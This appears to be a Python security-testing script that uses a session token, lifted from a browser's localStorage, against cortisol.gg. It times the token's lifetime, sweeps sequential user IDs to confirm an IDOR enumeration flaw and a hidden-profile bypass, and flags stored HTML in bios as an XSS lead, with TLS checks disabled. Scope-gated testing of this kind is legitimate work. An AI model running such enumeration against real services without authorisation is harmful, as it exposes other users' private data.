#!/usr/bin/env python3
"""token_probe.py - with a fresh operator-supplied session, answer two things for cortisol.gg:
  (1) TOKEN TTL: poll /api/me and report how long the token stays alive (debunk/confirm "30s").
  (2) HIDDEN-PROFILE LEAK: sweep sequential user ids; if /api/users/{id} returns data for a user
      whose own `hidden` flag is true, the privacy toggle is bypassable -> real finding.
  Also re-confirms the enumeration oracle and re-captures the stored-HTML bio lead.

Seed (--seed): the bookmarklet blob {"ls":{"cb_token":...}, "ua":...}. Deleted after read.
Token is NEVER printed or logged. Read-only GET. Scope-gated to cortisol.gg.
"""
from __future__ import annotations
import sys, json, argparse, pathlib, urllib.request, urllib.error, ssl, re, time

BASE = "https://cortisol.gg"
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE


def req(path, token):
    rq = urllib.request.Request(BASE + path, headers={"Authorization": "Bearer " + token,
                                                       "User-Agent": "Mozilla/5.0"})
    try:
        r = urllib.request.urlopen(rq, timeout=20, context=CTX)
        return r.status, r.read(20000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(2000).decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--scope", default="scope_cortisol.json")
    ap.add_argument("--seed", required=True)
    ap.add_argument("--out", default="token_probe_result.json")
    ap.add_argument("--sweep", type=int, default=12)
    ap.add_argument("--ttl-watch", type=int, default=180)
    a = ap.parse_args()

    scope = json.loads(pathlib.Path(a.scope).read_text())
    if "cortisol.gg" not in scope.get("authorized_assets", []):
        print("REFUSED: cortisol.gg not in scope"); return 2

    sf = pathlib.Path(a.seed); seed = json.loads(sf.read_text())
    try: sf.unlink()
    except Exception: pass
    token = (seed.get("ls", {}) or {}).get("cb_token") or seed.get("cb_token")
    if not token:
        print("NO cb_token in seed"); return 1

    st, body = req("/api/me", token)
    if st != 200:
        print(f"[cortisol] token not live on arrival ({st}) - need a fresher grab")
        pathlib.Path(a.out).write_text(json.dumps({"me_status": st})); return 1
    me = json.loads(body)["user"]; my_id = me["id"]
    print(f"[cortisol] authed id={my_id} user={me['username']} isAdmin={me.get('isAdmin')}")

    rl = 1.0 / max(scope.get("rate_limit_rps", 2), 0.5)

    # --- (2+3) enumeration re-confirm + hidden-profile leak + bio capture ---
    targets = [4000000000000001 + i for i in range(a.sweep)]
    users, hidden_leaks, html_bios = [], [], []
    for tid in targets:
        if tid == my_id:
            continue
        st, body = req(f"/api/users/{tid}", token); time.sleep(rl)
        if st == 200 and body.strip().startswith("{"):
            try: u = json.loads(body)
            except Exception: continue
            users.append({"id": u.get("id"), "username": u.get("username"),
                          "hidden": u.get("hidden"), "vip": u.get("vip")})
            if u.get("hidden") is True:
                hidden_leaks.append({"id": u.get("id"), "username": u.get("username"),
                                     "returned_fields": sorted(u.keys())})
            bio = u.get("bio") or ""
            if "<" in bio and ">" in bio:   # unescaped HTML stored in bio
                html_bios.append({"id": u.get("id"), "username": u.get("username"), "bio": bio[:200]})

    enum_confirmed = len(users) >= 2
    findings = []
    if enum_confirmed:
        findings.append({"class": "idor-user-enumeration", "severity": "medium",
                         "endpoint": "/api/users/{id}", "confirmed": True,
                         "users_read": len(users),
                         "validated_by": "sequential ids return distinct other users' profiles"})
    if hidden_leaks:
        findings.append({"class": "hidden-profile-bypass", "severity": "high",
                         "endpoint": "/api/users/{id}", "confirmed": True,
                         "evidence": hidden_leaks[:5],
                         "validated_by": "profile with hidden=true still returns full data to another user"})
    if html_bios:
        findings.append({"class": "stored-html-in-bio (XSS lead)", "severity": "needs-render-check",
                         "endpoint": "/api/users/{id}", "confirmed": False,
                         "evidence": html_bios[:5],
                         "validated_by": "unescaped HTML persisted server-side; execution depends on client render"})

    # --- (1) TTL watch: poll /api/me until it dies or watch window ends ---
    print(f"[cortisol] watching token lifetime up to {a.ttl_watch}s ...")
    t0 = time.time(); timeline = []; last_alive = 0; died_at = None
    while time.time() - t0 < a.ttl_watch:
        st, _ = req("/api/me", token)
        el = round(time.time() - t0)
        timeline.append({"t": el, "me": st})
        if st == 200:
            last_alive = el
        else:
            died_at = el; break
        time.sleep(15)

    out = {"authed_as": {"id": my_id, "isAdmin": me.get("isAdmin")},
           "ttl": {"last_alive_s": last_alive, "died_at_s": died_at,
                   "still_alive_at_end": died_at is None, "watch_window_s": a.ttl_watch,
                   "timeline": timeline},
           "enumeration_confirmed": enum_confirmed,
           "hidden_profile_leak": bool(hidden_leaks),
           "html_bios_found": len(html_bios),
           "findings": findings}
    pathlib.Path(a.out).write_text(json.dumps(out, indent=2))
    print(json.dumps({k: out[k] for k in ("ttl", "enumeration_confirmed",
                                          "hidden_profile_leak", "html_bios_found")}, indent=2))
    print(f"[cortisol] {len(findings)} finding(s) -> {a.out}")
    print("DONE")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
